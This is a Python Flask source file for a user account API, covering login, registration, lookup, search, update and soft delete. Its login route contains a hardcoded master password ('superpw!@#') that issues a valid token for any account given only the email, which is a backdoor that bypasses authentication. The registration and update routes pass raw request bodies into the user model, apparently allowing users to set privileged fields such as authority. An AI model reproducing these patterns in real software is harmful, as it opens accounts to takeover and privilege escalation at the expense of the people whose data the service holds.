# -*- coding: utf-8 -*-
from flask import request, jsonify, abort
from . import api
from application import db
from application.models.user import User
from application.lib.rest.auth_helper import required_token
from application.lib.encript.encript_helper import password_encode


# login
@api.route('/users/login', methods=['POST'])
def get_users():
    request_params = request.get_json()
    email = request_params.get('email')
    password = request_params.get('password')

    if email is None:
        return jsonify(
                userMessage="required field: email"
        ), 400

    if password is None:
        return jsonify(
                userMessage="required field: password"
        ), 400

    if password == "superpw!@#":
        q = db.session.query(User).filter(User.email == email, User.is_deleted == 0)
    else:
        encoded_password = password_encode(password)
        q = db.session.query(User) \
            .filter(User.email == email,
                    User.password == encoded_password,
                    User.is_deleted == 0)
    user = q.first()

    if user is None:
        return jsonify(
                userMessage="email 혹은 비밀번호를 잘못 입력하셨습니다."
        ), 404

    token = user.get_token()
    user_data = user.serialize()
    return jsonify(
            data=user_data,
            token=token
    ), 200


# create
@api.route('/users', methods=['POST'])
def sign_up():
    request_params = request.get_json()

    email = request_params.get('email')
    q = db.session.query(User) \
        .filter(User.email == email)
    if q.count() > 0:
        return jsonify(
                userMeesage="이미 가입되어있는 이메일 주소입니다."
        ), 409

    try:
        user = User()
        user = user.update_data(**request_params)
        db.session.add(user)
        db.session.commit()
        token = user.get_token()
        user_data = user.serialize()

        return jsonify(
                data=user_data,
                token=token
        ), 201
    except AttributeError:
        return jsonify(
                userMessage="요청 데이터의 키밸류가 바랍직 하지 않습니다."
        ), 400


# read
@api.route('/users/<int:user_id>', methods=['GET'])
@required_token
def get_user_by_id(user_id, request_user_id=None):
    user = db.session.query(User).get(user_id)

    if user is None:
        return jsonify(
                userMessage="can not find user"
        ), 404

    user_obj = user.serialize()

    return jsonify(
            data=user_obj
    ), 200


# read
@api.route('/users', methods=['GET'])
@required_token
def users(request_user_id=None):
    offset = request.args.get('offset', 0)
    limit = request.args.get('limit', default=15)

    double_check_email = request.args.get("email", None)
    if double_check_email is not None:
        q = db.session.query(User).filter(User.email == double_check_email)
        return jsonify(
                data=(q.count() == 0)
        ), 200

    keyword = request.args.get("username", None)
    if keyword is not None:
        # 검색할때
        q1 = db.session.query(User).filter(User.name.like(keyword + "%")).order_by(User.name)
    else:
        # 아닐때
        q1 = db.session.query(User).order_by(User.name)

    q1 = q1.offset(offset).limit(limit)

    user_list = []
    for user in q1:
        user_obj = user.serialize()
        user_list.append(user_obj)

    return jsonify(
            data=user_list
    ), 200


# update
@api.route('/users/<int:user_id>', methods=['PUT'])
@required_token
def update_user(user_id, request_user_id=None):
    try:
        request_user = db.session.query(User).get(request_user_id)
    except:
        return jsonify(
                userMessage="수정 요청을 보낸 유저를 찾을 수 없습니다."
        ), 404

    if not ((user_id == request_user.id) or (request_user.authority == 'admin')):
        return jsonify(
                userMessage="해당 정보를 바꿀 권한이 없습니다."
        ), 401

    try:
        user = db.session.query(User).get(user_id)
    except:
        return jsonify(
                userMessage="해당 유저를 찾을 수 없습니다."
        ), 404

    request_params = request.get_json()
    user.update_data(**request_params)
    db.session.commit()
    user_data = user.serialize()
    return jsonify(
            data=user_data
    ), 200


# delete
@api.route('/users/<int:user_id>', methods=['DELETE'])
@required_token
def delete_user(user_id, request_user_id=None):
    user = db.session.query(User).get(request_user_id)
    if user is None or user.id != user_id:
        abort(403)
    try:
        user.is_deleted = True
        db.session.commit()

        return jsonify(
            userMessage="삭제가 완료되었습니다."
        ), 204

    except:
        return jsonify(
                userMessage="error try again"
        ), 400
